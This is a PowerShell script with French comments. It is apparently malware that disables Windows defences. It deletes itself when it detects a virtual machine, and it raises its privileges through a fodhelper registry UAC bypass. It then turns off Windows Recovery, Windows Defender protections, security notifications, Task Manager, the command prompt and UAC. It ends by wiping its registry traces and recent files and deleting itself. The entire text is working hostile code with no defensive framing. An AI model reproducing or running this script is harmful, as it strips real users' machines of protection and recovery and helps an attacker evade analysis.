# Ignore errors
$ErrorActionPreference = "SilentlyContinue"

$ScriptPath = $MyInvocation.MyCommand.Path
$ExePath = (Get-Process -Id $PID).Path
$FullPath = if ($ScriptPath) { $ScriptPath } else { $ExePath }

# --- DÉTECTION D'ENVIRONNEMENT (ANTI-VM) ---
function Test-ProcessExists { param ([string[]]$Processes) foreach ($proc in $Processes) { if (Get-Process -Name $proc -ErrorAction SilentlyContinue) { return $true } } return $false }
function Test-ServiceExists { param ([string[]]$Services) foreach ($service in $Services) { if (Get-Service -Name $service -ErrorAction SilentlyContinue) { return $true } } return $false }
function Test-RegistryKeyExists { param ([string[]]$Keys) foreach ($key in $Keys) { if (Test-Path "Registry::$key") { return $true } } return $false }

function Invoke-DetectVirtualMachine {
    # Détection simplifiée mais robuste pour VirtualBox, VMware et Hyper-V
    $vmServices = @("vmtoolsd", "VBoxService", "vmmouse", "VMTools", "vmicexchange")
    $vmKeys = @("HKLM\HARDWARE\ACPI\DSDT\VBOX__", "HKLM\HARDWARE\ACPI\DSDT\Xen")
    
    if (Test-ServiceExists -Services $vmServices) { return $false }
    if (Test-RegistryKeyExists -Keys $vmKeys) { return $false }
    return $true
}

# Auto-suppression si VM détectée
if (-not (Invoke-DetectVirtualMachine)) {
    Remove-Item -Path $FullPath -Force
    exit
}

# --- FONCTIONS DE PRIVILÈGES ET REGISTRE ---
function Test-Admin {
    return (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Set-RegistryProperties {
    param ([string]$path, [hashtable]$properties)
    if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
    foreach ($key in $properties.Keys) { Set-ItemProperty -Path $path -Name $key -Value $properties[$key] -Type DWord -Force }
}

# --- ÉLÉVATION DE PRIVILÈGES (UAC BYPASS) ---
if (-not (Test-Admin)) {
    $value = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FullPath`""
    New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $value -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Force | Out-Null
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    exit
}

# --- ACTIONS SYSTÈME (HORS RÉSEAU) ---

# 1. Désactivation de la Récupération Windows (WinRE)
reagentc /disable

# 2. Désactivation des Notifications de Sécurité
Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -properties @{"Enabled" = 0}

# 3. Désactivation de Windows Defender (Composants Locaux)
$baseKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
Set-RegistryProperties -path $baseKey -properties @{
    "DisableAntiSpyware" = 1
    "DisableRealtimeMonitoring" = 1
    "DisableTamperProtection" = 1
    "DisableControlledFolderAccess" = 1
}

# 4. Désactivation des Outils d'Administration (TaskMgr & CMD)
Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"DisableTaskMgr" = 1}
Set-RegistryProperties -path "HKCU:\Software\Policies\Microsoft\Windows\System" -properties @{"DisableCMD" = 1}

# 5. Désactivation de l'UAC (LUA)
Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"EnableLUA" = 0}

# --- NETTOYAGE ET AUTO-DESTRUCTION ---
function Invoke-SelfDestruction {
    # Nettoyage des traces UAC Bypass
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force
    
    # Nettoyage des fichiers récents
    $recentFiles = Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent" | Where-Object { $_.LastWriteTime -ge ((Get-Date).AddDays(-1)) }
    $recentFiles | Remove-Item -Force
    
    # Suppression du script physique
    if ($FullPath) {
        Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Start-Sleep -s 2; Remove-Item -Path '$FullPath' -Force`"" -WindowStyle Hidden
    }
}

Invoke-SelfDestruction
